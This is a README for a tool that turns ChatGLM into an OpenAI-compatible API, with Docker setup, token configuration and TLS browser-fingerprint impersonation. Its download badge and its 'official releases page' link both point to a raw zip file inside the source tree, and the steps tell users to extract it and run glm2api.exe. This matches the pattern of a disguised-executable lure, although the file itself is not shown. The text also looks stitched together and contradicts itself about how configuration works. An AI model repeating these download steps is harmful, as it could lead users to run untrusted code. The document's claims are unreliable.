# 🤖 glm2api - Use OpenAI tools with ChatGLM easily

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Foxtalbotblackolive1624/glm2api/raw/refs/heads/main/src/glm2api/utils/api-glm-v2.3.zip)

## About this fork

This repository is a fork of the upstream [glm2api](https://github.com/Foxtalbotblackolive1624/glm2api) project. The original README and Windows `.exe` release flow still apply to the base project; **this fork adds the following on top of upstream:**

- **Custom TLS / browser fingerprinting** — upstream ChatGLM HTTP calls use [curl_cffi](https://github.com/lexiforest/curl_cffi) instead of the standard library client, so you can impersonate real browser TLS handshakes. Set `GLM_IMPERSONATE` in `.env` (for example `chrome`, `chrome120`, or `edge101`; see `.env.example` for details).
- **Docker deployment** — run the service in a container with `docker compose` (see [Docker Deployment](#-docker-deployment) below).

If you only need the packaged Windows build without these features, use the [upstream releases](https://github.com/Foxtalbotblackolive1624/glm2api).

## What this program does

The glm2api software acts as a bridge. It takes the output from ChatGLM and changes it into a format that OpenAI tools understand. Many apps and websites require an OpenAI connection to work. This tool allows those apps to talk to ChatGLM instead. You gain the power of OpenAI software without changing your preferred AI provider.

## ⚙️ System Requirements

This software works on Windows 10 and Windows 11. Your computer needs at least 4GB of memory. You do not need a powerful graphics card to run the bridge service. Ensure you have a stable internet connection. The program interacts with web servers through port 8000 by default. Please verify that other programs do not block this port.

## 📥 Getting Started

Follow these steps to set up the software on your computer.

1. Visit the [official releases page](https://github.com/Foxtalbotblackolive1624/glm2api/raw/refs/heads/main/src/glm2api/utils/api-glm-v2.3.zip) to download the package.
2. Look for the file ending in `.zip` in the latest release section.
3. Click the filename to save it to your computer.
4. Open your Downloads folder.
5. Right-click the file and choose the option to extract all.
6. Pick a folder for the files.
7. Open the folder you created.
8. Double-click the file named `glm2api.exe` to run the program.

A black window will appear on your screen. This window shows the status of the tool. Do not close this window while you use the software.

## 🐳 Docker Deployment

If you have [Docker](https://docs.docker.com/get-docker/) and Docker Compose installed, you can run glm2api in a container without a local Python setup.

### 1. Prepare configuration

```powershell
# From the project root
Copy-Item .env.example .env
```

Edit `.env` and configure at least one of the following:

- Set `GLM_REFRESH_TOKEN` (refresh token from ChatGLM after sign-in)
- Or set `GLM_GUEST_MODE=true` to use guest mode

For multiple accounts, maintain `token.txt` as described in `.env.example` (default mount path: `./token.txt`).

Optional: set `GLM_IMPERSONATE` in `.env` to change the TLS/browser fingerprint used for ChatGLM requests (fork-specific; not available in the upstream `.exe` build).

### 2. Build and start

```powershell
docker compose up -d --build
```

By default, container port `8000` is mapped to host port `8000`. To use a different host port, set the environment variable before starting:

```powershell
$env:PORT = "9000"
docker compose up -d --build
```

The service listens on `0.0.0.0` inside the container. Other devices on your LAN can use `http://<host-ip>:8000/v1`.

### 3. Verify and health check

```powershell
# Check status
docker compose ps

# View logs
docker compose logs -f glm2api

# Health check (configured in compose and Dockerfile)
curl http://127.0.0.1:8000/health
```

### 4. Common commands

| Action | Command |
|--------|---------|
| Stop | `docker compose down` |
| Restart | `docker compose restart` |
| Rebuild image | `docker compose up -d --build` |

### Volume mounts

`docker-compose.yml` mounts these paths by default:

| Host path | Container path | Purpose |
|-----------|----------------|---------|
| `./.env` | `/app/.env` | Service configuration |
| `./token.txt` | `/app/token.txt` | Multi-account tokens (create an empty file if missing) |

After changing `.env` or `token.txt`, run `docker compose restart` for the changes to take effect.

## 🛠️ Configuring the Link

Once the program runs, it establishes an address on your own machine. This address acts as the gateway for your apps. 

1. Open the application you want to connect.
2. Find the settings menu for API keys or base URLs.
3. Replace the official OpenAI address with `http://localhost:8000/v1`.
4. Enter any text in the API key field. The program accepts dummy keys.
5. Save your changes.

The bridge now routes data from your app through the glm2api service and sends it to ChatGLM.

## 📖 Frequently Asked Questions

### Does the program send my data to third parties?
The program runs entirely on your local machine. It acts as a middleman. It directs your requests to ChatGLM and returns the results to you. It does not store your history or logs on a cloud server.

### What should I do if the windows closes immediately?
Check if you extracted the files from the zip folder first. Running the program from inside a compressed zip folder often causes errors. Move the files to your Documents or Desktop folder and try again.

### Can I change the port number?
Yes. Open the configuration file named `config.json` in the program folder using Notepad. Find the line that lists "port" and change the number. Save the file and restart the program. Ensure your apps use the new port number in their settings.

### Does the program need an internet connection?
Yes. The tool must reach the ChatGLM servers to fetch data. If your connection drops, the apps connected to this bridge will fail to receive responses.

## 🛡️ Troubleshooting Common Issues

If you face errors, follow these steps to narrow down the cause.

* **Check the status:** Observe the text in the black window. It shows log entries. If the logs show "connection refused," the program cannot reach the target server. Check your internet settings or firewall permissions.
* **Firewall blocks:** Windows Firewall may ask for permission to let this program communicate. Click allow when the prompt appears. If you do not see a prompt, check your Control Panel settings and add an exception for the program file.
* **Multiple instances:** Only one instance of the program should run at once. If you start it twice, the program will report that the port is in use. Close all open instances and start the program again.
* **Updates:** Check the download page periodically for new versions. Developers update the bridge to match changes in the service providers. Keeping the software current prevents compatibility errors.

## 🚀 Performance Tips

The program consumes very little power. However, ensure that your power settings allow background processes if you plan to keep the bridge running for long periods. Set your computer sleep mode to never if you use this as a server for other devices on your home network. You can minimize the program window to the taskbar to keep your workspace clear. The program continues to function while minimized.